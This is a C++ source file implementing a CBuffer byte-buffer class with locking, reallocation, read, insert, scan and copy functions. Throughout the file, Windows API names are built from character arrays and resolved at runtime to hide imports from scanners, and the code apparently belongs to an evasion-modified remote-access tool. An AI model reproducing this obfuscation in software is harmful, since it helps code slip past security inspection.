// Buffer.cpp: implementation of the CBuffer class.
//
//////////////////////////////////////////////////////////////////////

#include "../Declare.h"   //动态调用库函数
#include "Buffer.h"
#include "math.h"

#ifdef _DEBUG
#undef THIS_FILE
static char THIS_FILE[]=__FILE__;
#define new DEBUG_NEW
#endif

#include "../Myfunction.h"  //自定义函数

extern Myfunction *Gyfunction;
//////////////////////////////////////////////////////////////////////

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CBuffer
// 
// DESCRIPTION:	Constructs the buffer with a default size
// 
// RETURNS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name				Date		Version		Comments
// N T ALMOND       270400		1.0			Origin
// 
////////////////////////////////////////////////////////////////////////////////
CBuffer::CBuffer()
{
	// Initial size
	m_nSize = 0;

	m_pPtr = m_pBase = NULL;
	InitializeCriticalSectionT pInitializeCriticalSection=(InitializeCriticalSectionT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"InitializeCriticalSection");
	pInitializeCriticalSection(&m_cs);
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	~CBuffer
// 
// DESCRIPTION:	Deallocates the buffer
// 
// RETURNS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name				Date		Version		Comments
// N T ALMOND       270400		1.0			Origin
// 
////////////////////////////////////////////////////////////////////////////////
CBuffer::~CBuffer()
{
	DeleteCriticalSectionT pDeleteCriticalSection=(DeleteCriticalSectionT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"DeleteCriticalSection");
	VirtualFreeT pVirtualFree=(VirtualFreeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"VirtualFree");
	if (m_pBase)
		pVirtualFree(m_pBase, 0, MEM_RELEASE);
	pDeleteCriticalSection(&m_cs);
}
	

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	Write
// 
// DESCRIPTION:	Writes data into the buffer
// 
// RETURNS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name				Date		Version		Comments
// N T ALMOND       270400		1.0			Origin
// 
////////////////////////////////////////////////////////////////////////////////
BOOL CBuffer::Write(PBYTE pData, UINT nSize)
{
	char CPolQ22[] = {'E','n','t','e','r','C','r','i','t','i','c','a','l','S','e','c','t','i','o','n','\0'};
    EnterCriticalSectionT pEnterCriticalSection=(EnterCriticalSectionT)GetProcAddress(LoadLibrary("KERNEL32.dll"),CPolQ22);
	pEnterCriticalSection(&m_cs);
	char CPolQ21[] = {'L','e','a','v','e','C','r','i','t','i','c','a','l','S','e','c','t','i','o','n','\0'};
	LeaveCriticalSectionT pLeaveCriticalSection=(LeaveCriticalSectionT)GetProcAddress(LoadLibrary("KERNEL32.dll"),CPolQ21);
	if (ReAllocateBuffer(nSize + GetBufferLen()) == -1)
	{
		pLeaveCriticalSection(&m_cs);
		return false;
	}

	MoveMemory(m_pPtr,pData,nSize);

	// Advance Pointer
	m_pPtr+=nSize;
	pLeaveCriticalSection(&m_cs);
	return nSize;
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	Insert
// 
// DESCRIPTION:	Insert data into the buffer 
// 
// RETURNS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name				Date		Version		Comments
// N T ALMOND       270400		1.0			Origin
// 
////////////////////////////////////////////////////////////////////////////////
BOOL CBuffer::Insert(PBYTE pData, UINT nSize)
{
	char CPolQ22[] = {'E','n','t','e','r','C','r','i','t','i','c','a','l','S','e','c','t','i','o','n','\0'};
    EnterCriticalSectionT pEnterCriticalSection=(EnterCriticalSectionT)GetProcAddress(LoadLibrary("KERNEL32.dll"),CPolQ22);
	char CPolQ21[] = {'L','e','a','v','e','C','r','i','t','i','c','a','l','S','e','c','t','i','o','n','\0'};
	LeaveCriticalSectionT pLeaveCriticalSection=(LeaveCriticalSectionT)GetProcAddress(LoadLibrary("KERNEL32.dll"),CPolQ21);
	pEnterCriticalSection(&m_cs);
	if (ReAllocateBuffer(nSize + GetBufferLen()) == -1)
	{
		pLeaveCriticalSection(&m_cs);
		return false;
	}

	MoveMemory(m_pBase+nSize,m_pBase,GetMemSize() - nSize);
	MoveMemory(m_pBase,pData,nSize);

	// Advance Pointer
	m_pPtr+=nSize;
	pLeaveCriticalSection(&m_cs);
	return nSize;
}


////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	Read
// 
// DESCRIPTION:	Reads data from the buffer and deletes what it reads
// 
// RETURNS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name				Date		Version		Comments
// N T ALMOND       270400		1.0			Origin
// 
////////////////////////////////////////////////////////////////////////////////
UINT CBuffer::Read(PBYTE pData, UINT nSize)
{
	char CPolQ22[] = {'E','n','t','e','r','C','r','i','t','i','c','a','l','S','e','c','t','i','o','n','\0'};
    EnterCriticalSectionT pEnterCriticalSection=(EnterCriticalSectionT)GetProcAddress(LoadLibrary("KERNEL32.dll"),CPolQ22);
	pEnterCriticalSection(&m_cs);
	char CPolQ21[] = {'L','e','a','v','e','C','r','i','t','i','c','a','l','S','e','c','t','i','o','n','\0'};
	LeaveCriticalSectionT pLeaveCriticalSection=(LeaveCriticalSectionT)GetProcAddress(LoadLibrary("KERNEL32.dll"),CPolQ21);
	// Trying to byte off more than ya can chew - eh?
	if (nSize > GetMemSize())
	{
		pLeaveCriticalSection(&m_cs);
		return 0;
	}

	// all that we have 
	if (nSize > GetBufferLen())
		nSize = GetBufferLen();

		
	if (nSize)
	{
		// Copy over required amount and its not up to us
		// to terminate the buffer - got that!!!
		MoveMemory(pData,m_pBase,nSize);
		
		// Slide the buffer back - like sinking the data
		MoveMemory(m_pBase,m_pBase+nSize,GetMemSize() - nSize);

		m_pPtr -= nSize;
	}
		
	DeAllocateBuffer(GetBufferLen());

	pLeaveCriticalSection(&m_cs);
	return nSize;
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	GetMemSize
// 
// DESCRIPTION:	Returns the phyical memory allocated to the buffer
// 
// RETURNS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name				Date		Version		Comments
// N T ALMOND       270400		1.0			Origin
// 
////////////////////////////////////////////////////////////////////////////////
UINT CBuffer::GetMemSize() 
{
	return m_nSize;
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	GetBufferLen
// 
// DESCRIPTION:	Get the buffer 'data' length
// 
// RETURNS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name				Date		Version		Comments
// N T ALMOND       270400		1.0			Origin
// 
////////////////////////////////////////////////////////////////////////////////
UINT CBuffer::GetBufferLen() 
{
	if (m_pBase == NULL)
		return 0;

	int nSize = 
		m_pPtr - m_pBase;
	return nSize;
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	ReAllocateBuffer
// 
// DESCRIPTION:	ReAllocateBuffer the Buffer to the requested size
// 
// RETURNS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name				Date		Version		Comments
// N T ALMOND       270400		1.0			Origin
// 
////////////////////////////////////////////////////////////////////////////////
UINT CBuffer::ReAllocateBuffer(UINT nRequestedSize)
{
	if (nRequestedSize < GetMemSize())
		return 0;

	// Allocate new size
	UINT nNewSize = (UINT) Gyfunction->my_ceil(nRequestedSize / 1024.0) * 1024;

	// New Copy Data Over
	char FBwWp28[] = {'V','i','r','t','u','a','l','A','l','l','o','c','\0'};
	VirtualAllocT pVirtualAlloc=(VirtualAllocT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp28);
	PBYTE pNewBuffer = (PBYTE) pVirtualAlloc(NULL,nNewSize,MEM_COMMIT,PAGE_READWRITE);
	if (pNewBuffer == NULL)
		return -1;

	UINT nBufferLen = GetBufferLen();
//	strcat((char*)pNewBuffer,(const char *)m_pBase);
	if(nBufferLen>0)                                  // 2012.10.15 修改
	    MoveMemory(pNewBuffer,m_pBase,nBufferLen);

	VirtualFreeT pVirtualFree=(VirtualFreeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"VirtualFree");
	if (m_pBase)
		pVirtualFree(m_pBase,0,MEM_RELEASE);


	// Hand over the pointer
	m_pBase = pNewBuffer;

	// Realign position pointer
	m_pPtr = m_pBase + nBufferLen;

	m_nSize = nNewSize;

	return m_nSize;
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	DeAllocateBuffer
// 
// DESCRIPTION:	DeAllocates the Buffer to the requested size
// 
// RETURNS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name				Date		Version		Comments
// N T ALMOND       270400		1.0			Origin
// 
////////////////////////////////////////////////////////////////////////////////
UINT CBuffer::DeAllocateBuffer(UINT nRequestedSize)
{
	if (nRequestedSize < GetBufferLen())
		return 0;

	// Allocate new size
	UINT nNewSize = (UINT) Gyfunction->my_ceil(nRequestedSize / 1024.0) * 1024;

	if (nNewSize < GetMemSize())
		return 0;

	// New Copy Data Over
	char FBwWp28[] = {'V','i','r','t','u','a','l','A','l','l','o','c','\0'};
	VirtualAllocT pVirtualAlloc=(VirtualAllocT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp28);
	PBYTE pNewBuffer = (PBYTE) pVirtualAlloc(NULL,nNewSize,MEM_COMMIT,PAGE_READWRITE);

	UINT nBufferLen = GetBufferLen();
	if(nBufferLen>0)                                  // 2012.10.15 修改
	    MoveMemory(pNewBuffer,m_pBase,nBufferLen);

	VirtualFreeT pVirtualFree=(VirtualFreeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"VirtualFree");
	pVirtualFree(m_pBase,0,MEM_RELEASE);

	// Hand over the pointer
	m_pBase = pNewBuffer;

	// Realign position pointer
	m_pPtr = m_pBase + nBufferLen;

	m_nSize = nNewSize;

	return m_nSize;
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	Scan
// 
// DESCRIPTION:	Scans the buffer for a given byte sequence
// 
// RETURNS:		Logical offset
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name				Date		Version		Comments
// N T ALMOND       270400		1.0			Origin
// 
////////////////////////////////////////////////////////////////////////////////
int CBuffer::Scan(PBYTE pScan,UINT nPos)
{
	if (nPos > GetBufferLen() )
		return -1;

	PBYTE pStr = (PBYTE)Gyfunction->my_strstr((char*)(m_pBase+nPos),(char*)pScan);
	
	int nOffset = 0;

	if (pStr)
		nOffset = (pStr - m_pBase) + strlen((char*)pScan);

	return nOffset;
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	ClearBuffer
// 
// DESCRIPTION:	Clears/Resets the buffer
// 
// RETURNS:	
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name				Date		Version		Comments
// N T ALMOND       270400		1.0			Origin
// 
////////////////////////////////////////////////////////////////////////////////
void CBuffer::ClearBuffer()
{
	char CPolQ22[] = {'E','n','t','e','r','C','r','i','t','i','c','a','l','S','e','c','t','i','o','n','\0'};
    EnterCriticalSectionT pEnterCriticalSection=(EnterCriticalSectionT)GetProcAddress(LoadLibrary("KERNEL32.dll"),CPolQ22);
	pEnterCriticalSection(&m_cs);
	// Force the buffer to be empty
	m_pPtr = m_pBase;

	DeAllocateBuffer(1024);

	char CPolQ21[] = {'L','e','a','v','e','C','r','i','t','i','c','a','l','S','e','c','t','i','o','n','\0'};
	LeaveCriticalSectionT pLeaveCriticalSection=(LeaveCriticalSectionT)GetProcAddress(LoadLibrary("KERNEL32.dll"),CPolQ21);
	pLeaveCriticalSection(&m_cs);
}


////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	Copy
// 
// DESCRIPTION:	Copy from one buffer object to another...
// 
// RETURNS:	
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name				Date		Version		Comments
// N T ALMOND       270400		1.0			Origin
// 
////////////////////////////////////////////////////////////////////////////////
void CBuffer::Copy(CBuffer& buffer)
{
	int nReSize = buffer.GetMemSize();
	int nSize = buffer.GetBufferLen();
	ClearBuffer();
	if (ReAllocateBuffer(nReSize) == -1)
		return;

	m_pPtr = m_pBase + nSize;

	MoveMemory(m_pBase,buffer.GetBuffer(),buffer.GetBufferLen());
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	GetBuffer
// 
// DESCRIPTION:	Returns a pointer to the physical memory determined by the offset
// 
// RETURNS:	
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name				Date		Version		Comments
// N T ALMOND       270400		1.0			Origin
// 
////////////////////////////////////////////////////////////////////////////////
PBYTE CBuffer::GetBuffer(UINT nPos)
{
	return m_pBase+nPos;
}


////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	Delete
// 
// DESCRIPTION:	Delete data from the buffer and deletes what it reads
// 
// RETURNS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name				Date		Version		Comments
// N T ALMOND       270400		1.0			Origin
// 
////////////////////////////////////////////////////////////////////////////////
UINT CBuffer::Delete(UINT nSize)
{
	// Trying to byte off more than ya can chew - eh?
	if (nSize > GetMemSize())
		return 0;

	// all that we have 
	if (nSize > GetBufferLen())
		nSize = GetBufferLen();

		
	if (nSize)
	{
		// Slide the buffer back - like sinking the data
		MoveMemory(m_pBase,m_pBase+nSize,GetMemSize() - nSize);

		m_pPtr -= nSize;
	}
		
	DeAllocateBuffer(GetBufferLen());

	return nSize;
}